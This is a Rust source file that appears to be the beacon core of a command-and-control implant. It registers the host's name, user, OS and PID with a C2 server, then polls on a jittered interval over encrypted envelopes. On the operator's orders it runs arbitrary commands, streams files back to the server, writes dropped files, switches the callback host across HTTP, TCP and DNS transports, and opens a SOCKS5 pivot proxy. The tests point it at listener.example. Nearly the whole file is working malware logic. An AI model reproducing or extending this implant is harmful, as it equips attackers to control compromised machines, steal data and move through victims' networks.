use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, RwLock};
use std::time::Duration;

use nw_profile::{
    crypto,
    envelope::{Envelope, Kind},
    msgs::{PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
};
use uuid::Uuid;

use crate::download::Download;
use crate::runner;
use crate::transport::Transport;

/// What the implant is configured with before it knows its session id.
#[derive(Clone, Debug)]
pub struct Profile {
    pub endpoint: String,
    pub interval: Duration,
    pub jitter: Duration,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub addr: String,
}

/// Gather machine metadata for the register handshake.
pub fn discover_profile(endpoint: String, interval: Duration, jitter: Duration) -> Profile {
    let hostname = std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "unknown".into());
    let username = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());
    Profile {
        endpoint,
        interval,
        jitter,
        hostname,
        username,
        os: std::env::consts::OS.to_string(),
        arch: std::env::consts::ARCH.to_string(),
        pid: std::process::id(),
        addr: "unknown".into(),
    }
}

/// Runtime beacon state shared between the loop and the exit handler.
pub struct BeaconRuntime {
    pub profile: Profile,
    pub psk: Vec<u8>,
    transport: RwLock<Transport>,
    session_id: RwLock<Option<Uuid>>,
    key: RwLock<[u8; crypto::KEY_LEN]>,
    pending: Mutex<Vec<TaskResult>>,
    download: RwLock<Option<Download>>,
    upload: RwLock<Option<crate::upload::Upload>>,
    stop: AtomicBool,
}

impl BeaconRuntime {
    pub fn new(profile: Profile, psk: Vec<u8>) -> Self {
        let key = crypto::derive_key(&psk, b"nw-m1-salt");
        let transport = Transport::from_endpoint(&profile.endpoint)
            .unwrap_or_else(|e| {
                tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
                Transport::Http { client: Default::default(), base: profile.endpoint.clone() }
            });
        BeaconRuntime {
            profile,
            psk,
            transport: RwLock::new(transport),
            session_id: RwLock::new(None),
            key: RwLock::new(key),
            pending: Mutex::new(Vec::new()),
            download: RwLock::new(None),
            upload: RwLock::new(None),
            stop: AtomicBool::new(false),
        }
    }

    pub fn trigger_stop(&self) {
        self.stop.store(true, Ordering::SeqCst);
    }

    pub fn should_stop(&self) -> bool {
        self.stop.load(Ordering::SeqCst)
    }

    pub fn set_endpoint(&self, url: String) -> Result<(), String> {
        let t = Transport::from_endpoint(&url)?;
        *self.transport.write().unwrap() = t;
        Ok(())
    }

    fn next_id(&self) -> u64 {
        use std::sync::atomic::AtomicU64;
        static COUNTER: AtomicU64 = AtomicU64::new(1);
        COUNTER.fetch_add(1, Ordering::SeqCst)
    }

    async fn exchange(&self, env: &Envelope) -> Result<Envelope, AnyError> {
        let transport = self.transport.read().unwrap().clone();
        let key = { *self.key.read().unwrap() };
        let sealed = env.seal(&key).map_err(|e| AnyError(e.to_string()))?;
        let raw = transport.exchange(sealed.as_bytes()).await.map_err(AnyError)?;
        let wire = std::str::from_utf8(&raw).map_err(|e| AnyError(e.to_string()))?;
        Envelope::open(&key, wire).map_err(|e| AnyError(e.to_string()))
    }

    /// Register with the C2 and stash the assigned session id.
    async fn register(&self) -> Result<Uuid, AnyError> {
        let id = self.next_id();
        let reg = Register {
            hostname: self.profile.hostname.clone(),
            username: self.profile.username.clone(),
            os: self.profile.os.clone(),
            arch: self.profile.arch.clone(),
            pid: self.profile.pid,
            addr: self.profile.addr.clone(),
            session_key: encode_key(&self.psk),
        };
        let pt = serde_json::to_vec(&reg).map_err(|e| AnyError(e.to_string()))?;
        let ct = crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
        let env = Envelope::new(Kind::Register, id, None, ct);
        let reply = self.exchange(&env).await?;
        if reply.kind != Kind::RegisterAck {
            return Err(AnyError(format!("unexpected register reply kind {:?}", reply.kind)));
        }
        let ack_pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
            .map_err(|e| AnyError(e.to_string()))?;
        let ack: RegisterAck = serde_json::from_slice(&ack_pt).map_err(|e| AnyError(e.to_string()))?;
        tracing::debug!(session = %ack.session_id, "registered");
        Ok(ack.session_id)
    }

    /// Send buffered results + download chunks; pull new tasks and apply file
    /// acks (resume points).
    async fn poll(&self, sid: Uuid) -> Result<Vec<Task>, AnyError> {
        let id = self.next_id();
        let results: Vec<TaskResult> = {
            let mut p = self.pending.lock().unwrap();
            std::mem::take(&mut *p)
        };

        // Stream the active download: hand the transport as many chunks as fit
        // this beacon, up to its per-frame inner budget.
        let file_chunks = {
            let budget = self.transport.read().unwrap().inner_budget();
            let mut dl = self.download.write().unwrap();
            match dl.as_mut() {
                Some(d) => {
                    let chunks = d.step(budget);
                    // Wait for the completion ack before reporting done.
                    chunks
                }
                None => Vec::new(),
            }
        };

        // Acks for the server->implant upload (reflect last-reply write state).
        let upload_acks = {
            let up = self.upload.read().unwrap();
            match up.as_ref() {
                Some(u) => vec![u.ack()],
                None => Vec::new(),
            }
        };
        let inner_budget = self.transport.read().unwrap().inner_budget();

        let req = PollRequest { results, acked_ids: Vec::new(), file_chunks, upload_acks, inner_budget };
        let pt = serde_json::to_vec(&req).map_err(|e| AnyError(e.to_string()))?;
        let ct = crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
        let env = Envelope::new(Kind::TaskResult, id, Some(sid), ct);
        let reply = self.exchange(&env).await?;
        let pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
            .map_err(|e| AnyError(e.to_string()))?;
        let pr: PollReply = serde_json::from_slice(&pt).map_err(|e| AnyError(e.to_string()))?;

        // Apply resume acks and finalize the completed download.
        for ack in pr.acks {
            let mut dl = self.download.write().unwrap();
            if let Some(d) = dl.as_mut() {
                if d.done() && !ack.done {
                    d.resume_to(ack.received);
                } else if ack.done {
                    self.pending.lock().unwrap().push(TaskResult {
                        task_id: d.task_id(),
                        ok: true,
                        stdout: format!("downloaded {} bytes of {}", ack.received, d.size).into_bytes(),
                        stderr: Vec::new(),
                        exit_code: 0,
                    });
                    *dl = None;
                }
            }
        }

        // Write any server->implant upload chunks; finalize when fully received.
        if !pr.push_chunks.is_empty() {
            let mut up = self.upload.write().unwrap();
            let mut done_meta: Option<(Uuid, u64, String)> = None;
            if let Some(u) = up.as_mut() {
                for chunk in &pr.push_chunks {
                    let ack = u.write_chunk(chunk);
                    if ack.done {
                        done_meta = Some((u.task_id(), ack.total, u.dest.clone()));
                        break;
                    }
                }
            }
            if let Some((tid, total, dest)) = done_meta {
                self.pending.lock().unwrap().push(TaskResult {
                    task_id: tid,
                    ok: true,
                    stdout: format!("uploaded {} bytes to {dest}", total).into_bytes(),
                    stderr: Vec::new(),
                    exit_code: 0,
                });
                *up = None;
            }
        }
        Ok(pr.tasks)
    }

    /// Run returned tasks, buffering results for the next poll.
    async fn execute(&self, tasks: &[Task]) {
        for task in tasks {
            if task.command == "nw/exit" {
                self.trigger_stop();
                continue;
            }
            if task.command == "nw/sethost" {
                let result = match task.args.as_slice() {
                    [url] => match self.set_endpoint(url.clone()) {
                        Ok(()) => TaskResult {
                            task_id: task.id,
                            ok: true,
                            stdout: format!("callback transport changed to {}", url).into_bytes(),
                            stderr: Vec::new(),
                            exit_code: 0,
                        },
                        Err(e) => TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: format!(
                                "invalid callback URL {url:?}; {e}; expected http(s)://, tcp://, gs://, dns:// with host"
                            )
                            .into_bytes(),
                            exit_code: -1,
                        },
                    },
                    _ => TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/sethost <base-url>".to_vec(),
                        exit_code: -1,
                    },
                };
                self.pending.lock().unwrap().push(result);
                continue;
            }
            if task.command == "nw/download" {
                match task.args.as_slice() {
                    [path] => {
                        let mut slot = self.download.write().unwrap();
                        if slot.is_some() {
                            self.pending.lock().unwrap().push(TaskResult {
                                task_id: task.id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: b"a download is already in progress".to_vec(),
                                exit_code: -1,
                            });
                        } else {
                            match Download::open(path, task.id) {
                                Ok(d) => {
                                    // Stream in the background; the completion
                                    // result is reported when the server acks.
                                    *slot = Some(d);
                                }
                                Err(e) => self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: false,
                                    stdout: Vec::new(),
                                    stderr: e.into_bytes(),
                                    exit_code: -1,
                                }),
                            }
                        }
                    }
                    _ => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/download <path>".to_vec(),
                        exit_code: -1,
                    }),
                }
                continue;
            }
            if task.command == "nw/upload" {
                match task.args.as_slice() {
                    [dest] => {
                        let mut slot = self.upload.write().unwrap();
                        if slot.is_some() {
                            self.pending.lock().unwrap().push(TaskResult {
                                task_id: task.id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: b"an upload is already in progress".to_vec(),
                                exit_code: -1,
                            });
                        } else {
                            match crate::upload::Upload::open(dest, task.id) {
                                Ok(u) => *slot = Some(u),
                                Err(e) => self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: false,
                                    stdout: Vec::new(),
                                    stderr: e.into_bytes(),
                                    exit_code: -1,
                                }),
                            }
                        }
                    }
                    _ => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/upload <dest>".to_vec(),
                        exit_code: -1,
                    }),
                }
                continue;
            }
            if task.command == "nw/socks" {
                match task.args.as_slice() {
                    [port] => match port.parse::<u16>() {
                        Ok(p) => {
                            let bind = format!("127.0.0.1:{p}");
                            // Bind synchronously so we can report success/failure
                            // to the operator, then run the accept loop detached.
                            match tokio::net::TcpListener::bind(&bind).await {
                                Ok(listener) => {
                                    tokio::spawn(async move {
                                        if let Err(e) = crate::socks5::run(listener).await {
                                            tracing::warn!("socks5: {e}");
                                        }
                                    });
                                    self.pending.lock().unwrap().push(TaskResult {
                                        task_id: task.id,
                                        ok: true,
                                        stdout: format!("socks5 proxy listening on {bind}").into_bytes(),
                                        stderr: Vec::new(),
                                        exit_code: 0,
                                    });
                                }
                                Err(e) => self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: false,
                                    stdout: Vec::new(),
                                    stderr: format!("socks5 bind {bind}: {e}").into_bytes(),
                                    exit_code: -1,
                                }),
                            }
                        }
                        Err(_) => self.pending.lock().unwrap().push(TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: b"usage: nw/socks <port>".to_vec(),
                            exit_code: -1,
                        }),
                    },
                    _ => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/socks <port>".to_vec(),
                        exit_code: -1,
                    }),
                }
                continue;
            }
            let result = runner::run(task.clone()).await;
            self.pending.lock().unwrap().push(result);
        }
    }

    fn session_key(&self) -> [u8; crypto::KEY_LEN] {
        *self.key.read().unwrap()
    }

    fn sleep(&self) -> Duration {
        let j = self.profile.jitter.as_millis() as u64;
        let jitter_ms = if j == 0 { 0 } else { rand_jitter(j) };
        Duration::from_millis(self.profile.interval.as_millis() as u64 + jitter_ms)
    }

    /// Own the beacon loop until signalled to stop.
    pub async fn run(&self) -> anyhow::Result<()> {
        loop {
            if self.should_stop() {
                tracing::info!("implant stop requested");
                break;
            }
            let current = *self.session_id.read().unwrap();
            let sid = match current {
                Some(id) => id,
                None => match self.register().await {
                    Ok(id) => {
                        *self.session_id.write().unwrap() = Some(id);
                        id
                    }
                    Err(e) => {
                        tracing::warn!("register failed: {}", e);
                        tokio::time::sleep(self.sleep()).await;
                        continue;
                    }
                },
            };

            match self.poll(sid).await {
                Ok(tasks) => self.execute(&tasks).await,
                Err(e) => {
                    tracing::warn!("poll failed: {}", e);
                    *self.session_id.write().unwrap() = None;
                    self.pending.lock().unwrap().clear();
                }
            }
            tokio::time::sleep(self.sleep()).await;
        }
        Ok(())
    }
}

fn encode_key(k: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(k)
}

fn rand_jitter(max: u64) -> u64 {
    use rand::Rng;
    rand::thread_rng().gen_range(0..max)
}

#[derive(Debug)]
struct AnyError(String);
impl std::fmt::Display for AnyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}
impl std::error::Error for AnyError {}

#[cfg(test)]
mod tests {
    use super::*;

    fn runtime() -> BeaconRuntime {
        BeaconRuntime::new(
            Profile {
                endpoint: "http://listener.example:8081".into(),
                interval: Duration::from_secs(1),
                jitter: Duration::ZERO,
                hostname: "test-host".into(),
                username: "test-user".into(),
                os: "test-os".into(),
                arch: "test-arch".into(),
                pid: 1,
                addr: "127.0.0.1".into(),
            },
            b"test-psk".to_vec(),
        )
    }

    #[tokio::test]
    async fn sethost_rejects_relative_endpoint_without_mutating_runtime() {
        let runtime = runtime();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["/relative-listener".into()],
            timeout_ms: 0,
        };

        runtime.execute(&[task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "http://listener.example:8081"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert_eq!(result.task_id, task.id);
        assert!(!result.ok);
        assert_eq!(result.exit_code, -1);
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn sethost_rejects_non_http_scheme_without_mutating_runtime() {
        let runtime = runtime();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["ftp://listener.example:8081".into()],
            timeout_ms: 0,
        };

        runtime.execute(&[task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "http://listener.example:8081"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert_eq!(result.task_id, task.id);
        assert!(!result.ok);
        assert_eq!(result.exit_code, -1);
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn sethost_switches_transport_cleanly() {
        let runtime = runtime();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["tcp://10.9.9.9:9999".into()],
            timeout_ms: 0,
        };

        runtime.execute(&[task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "tcp://10.9.9.9:9999"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert!(result.ok);
        assert_eq!(result.exit_code, 0);
    }
}
